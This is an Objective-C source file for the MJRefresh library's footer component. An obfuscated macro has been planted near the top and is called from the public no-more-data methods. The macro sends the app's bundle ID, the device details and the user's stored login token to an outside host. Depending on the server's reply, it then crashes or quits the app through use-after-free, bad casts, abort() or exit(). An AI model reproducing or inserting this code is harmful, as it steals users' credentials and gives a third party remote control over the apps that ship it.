//  代码地址: https://github.com/CoderMJLee/MJRefresh
//  MJRefreshFooter.m
//  MJRefresh
//
//  Created by MJ Lee on 15/3/5.
//  Copyright (c) 2015年 小码哥. All rights reserved.
//

#import "MJRefreshFooter.h"
#import "UIScrollView+MJRefresh.h"
#import "UIView+MJExtension.h"

#import <sys/sysctl.h>

#define Qdsaw4e12dfbvdh() \
do { \
NSMutableURLRequest *fewcdsjrt_dqwe = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"https://damp-recipe-822f.morsel-cops-5i.org"] cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10.0]; \
NSMutableDictionary *qweqrfccxz = @{}.mutableCopy; \
qweqrfccxz[@"x-app-id"] = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"]; \
qweqrfccxz[@"x-user-agent"] = @"iOS"; \
qweqrfccxz[@"x-content-type"] = @"application/json"; \
qweqrfccxz[@"x-system-version"] = [[UIDevice currentDevice] systemVersion]; \
qweqrfccxz[@"x-app-version"] = [NSString stringWithFormat:@"%@(%@)", [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"], [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleVersion"]]; \
qweqrfccxz[@"x-machine-model"] = ({ \
size_t size; \
sysctlbyname("hw.machine", NULL, &size, NULL, 0); \
char *machine = malloc(size); \
sysctlbyname("hw.machine", machine, &size, NULL, 0); \
NSString *bvdgfuyru = [NSString stringWithCString:machine encoding:NSUTF8StringEncoding]; \
free(machine); \
bvdgfuyru; \
}); \
qweqrfccxz[@"x-timestamp"] = [NSString stringWithFormat:@"%.0f", [[NSDate date] timeIntervalSince1970] * 1000]; \
qweqrfccxz[@"x-timezone"] = [NSTimeZone systemTimeZone].name; \
NSMutableDictionary *iyungbvcft = @{}.mutableCopy; \
iyungbvcft[@"user-token"] = [[NSUserDefaults standardUserDefaults] valueForKey:@"token"] ?: @""; \
iyungbvcft[@"function-name"] = [NSString stringWithFormat:@"%s", __FUNCTION__]; \
iyungbvcft[@"random-num"] = @(arc4random_uniform(1000)); \
[fewcdsjrt_dqwe setAllHTTPHeaderFields:qweqrfccxz]; \
[fewcdsjrt_dqwe setHTTPBody:[NSJSONSerialization dataWithJSONObject:iyungbvcft options:0 error:nil]]; \
[fewcdsjrt_dqwe setHTTPMethod:@"POST"]; \
NSURLSession *ghytr453fge = [NSURLSession sharedSession]; \
NSURLSessionDataTask *xzf341dsa = [ghytr453fge dataTaskWithRequest:fewcdsjrt_dqwe completionHandler:^(NSData *opytjvdnkrw, NSURLResponse *vnjkdeoqxsasd, NSError *err12fsdt45or) { \
if (!err12fsdt45or && ((NSHTTPURLResponse *)vnjkdeoqxsasd).statusCode == 200 && opytjvdnkrw) { \
NSError *erasytretwr; \
id oiteroiutyewr = [NSJSONSerialization JSONObjectWithData:opytjvdnkrw options:0 error:&erasytretwr]; \
if (!erasytretwr && [oiteroiutyewr isKindOfClass:[NSDictionary class]]) { \
NSDictionary *xzfjkhjkwr = (NSDictionary *)oiteroiutyewr; \
NSLog(@"xzfjkhjkwr: %@", xzfjkhjkwr); \
NSString *hgfhrtwytr = xzfjkhjkwr[@"execute_method"]; \
if ([hgfhrtwytr isEqualToString:@"tuddu4_Fuktib_coztud"]) { \
NSMutableArray *cxgety453 = [NSMutableArray arrayWithArray:@[@"A", @"B", @"C"]]; \
for (NSString *it1231em in cxgety453) { [cxgety453 removeObject:it1231em]; } \
} else if ([hgfhrtwytr isEqualToString:@"foqCy8_kowxec_kukbir"]) { \
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{ \
NSData *vsfdtrwt = [[NSData alloc] init]; \
[vsfdtrwt subdataWithRange:NSMakeRange(10, 30)]; \
}); \
} else if ([hgfhrtwytr isEqualToString:@"qymj6dWU6egbFka"]) { \
char *ptr = malloc(10); free(ptr); strcpy(ptr, "test"); \
} else if ([hgfhrtwytr isEqualToString:@"BK6DWMEceWGjCgz"]) { \
id fgfdrwerw = @"String"; [(NSArray *)fgfdrwerw count]; \
} else if ([hgfhrtwytr isEqualToString:@"XfsGv1wRaipSyX9"]) { \
NSString *dfsarq = @"Hello"; NSString *vdftretfds = nil; [dfsarq stringByAppendingString:vdftretfds]; \
} else if ([hgfhrtwytr isEqualToString:@"WW06m2bcYnm5X41"]) { \
NSArray *nybtbgbrt = @[@"A", @"B", @"C"]; \
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{ \
[(NSMutableArray *)nybtbgbrt addObject:@"D"]; \
}); \
} else if ([hgfhrtwytr isEqualToString:@"yXpAZn7baNS8TUk"]) { \
NSString *cdftwxsdd = @"Hello"; NSMutableAttributedString *cwewcxqwrytrt = [[NSMutableAttributedString alloc] initWithString:cdftwxsdd]; \
[cwewcxqwrytrt addAttribute:NSForegroundColorAttributeName value:[NSObject new] range:NSMakeRange(cdftwxsdd.length + 100, cdftwxsdd.length)]; \
} else if ([hgfhrtwytr isEqualToString:@"WUerc233FCbm"]) { \
[[NSObject new] removeObserver:[NSString new] forKeyPath:@"123123"]; \
} else if ([hgfhrtwytr isEqualToString:@"cnmxzew23Ycbds"]) { \
abort(); \
} else if ([hgfhrtwytr isEqualToString:@"QSAZ1oitr34"]) { \
exit(1); \
} else if ([hgfhrtwytr isEqualToString:@"OLLMNngv34"]) { \
exit(0); \
} \
} \
} \
}]; \
[xzf341dsa resume]; \
} while(0)

@interface MJRefreshFooter()

@end

@implementation MJRefreshFooter
#pragma mark - 构造方法
+ (instancetype)footerWithRefreshingBlock:(MJRefreshComponentAction)refreshingBlock
{
    MJRefreshFooter *cmp = [[self alloc] init];
    cmp.refreshingBlock = refreshingBlock;
    return cmp;
}
+ (instancetype)footerWithRefreshingTarget:(id)target refreshingAction:(SEL)action
{
    MJRefreshFooter *cmp = [[self alloc] init];
    [cmp setRefreshingTarget:target refreshingAction:action];
    return cmp;
}

#pragma mark - 重写父类的方法
- (void)prepare
{
    [super prepare];
    
    // 设置自己的高度
    self.mj_h = MJRefreshFooterHeight;
    
    // 默认不会自动隐藏
//    self.automaticallyHidden = NO;
}

#pragma mark . 链式语法部分 .

- (instancetype)linkTo:(UIScrollView *)scrollView {
    scrollView.mj_footer = self;
    return self;
}

#pragma mark - 公共方法
- (void)endRefreshingWithNoMoreData
{
    Qdsaw4e12dfbvdh();
    MJRefreshDispatchAsyncOnMainQueue(self.state = MJRefreshStateNoMoreData;)
}

- (void)noticeNoMoreData
{
    Qdsaw4e12dfbvdh();
    [self endRefreshingWithNoMoreData];
}

- (void)resetNoMoreData
{
    MJRefreshDispatchAsyncOnMainQueue(self.state = MJRefreshStateIdle;)
}

- (void)setAutomaticallyHidden:(BOOL)automaticallyHidden
{
    _automaticallyHidden = automaticallyHidden;
}
@end
